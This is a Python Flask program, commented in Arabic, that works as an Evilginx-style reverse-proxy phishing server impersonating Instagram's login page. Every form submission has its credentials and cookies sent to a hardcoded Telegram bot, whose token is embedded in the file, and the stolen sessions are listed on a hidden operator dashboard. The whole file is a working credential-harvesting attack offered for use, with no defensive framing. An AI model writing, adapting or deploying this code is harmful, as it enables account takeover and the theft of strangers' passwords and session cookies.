import os
import requests
from flask import Flask, render_template, request, redirect, Response, make_response
import json
from datetime import datetime
from bs4 import BeautifulSoup

app = Flask(__name__)

# الإعدادات من Render
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1367401179")

# الموقع الذي تريد تقليده (مثلاً Instagram أو صفحة دخول معينة)
TARGET_SITE = "https://www.instagram.com/accounts/login/" 

captured_data = []

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

@app.route('/dashboard-private-77')
def dashboard():
    """لوحة التحكم السرية الخاصة بك فقط"""
    return render_template('dashboard.html', sessions=captured_data)

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    """هذا هو المحرك الذي يعمل مثل Evilginx"""
    url = f"{TARGET_SITE}{path}"
    
    # التقاط أي بيانات يتم إرسالها (يوزر وباسورد)
    if request.method == 'POST':
        creds = request.form.to_dict()
        cookies = request.cookies.to_dict()
        log_msg = (
            f"🎯 **صيد جديد (Evilginx Mode)**\n"
            f"👤 البيانات: `{json.dumps(creds)}`\n"
            f"🍪 الكوكيز: `{json.dumps(cookies)}`"
        )
        send_to_telegram(log_msg)
        captured_data.append({"site": TARGET_SITE, "cookies": cookies, "timestamp": datetime.now(), "ip": request.remote_addr})

    # جلب الموقع الحقيقي لعرضه للضحية
    headers = {key: value for (key, value) in request.headers if key != 'Host'}
    resp = requests.request(
        method=request.method,
        url=url,
        headers=headers,
        data=request.form,
        cookies=request.cookies,
        allow_redirects=False
    )

    # تعديل المحتوى لحقن سكريبت سحب الكوكيز (Session Hijacking)
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
    
    response = Response(resp.content, resp.status_code, headers)
    
    # التقاط الكوكيز التي يرسلها الموقع الأصلي وتخزينها
    for key, value in resp.cookies.items():
        response.set_cookie(key, value)
        
    return response

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
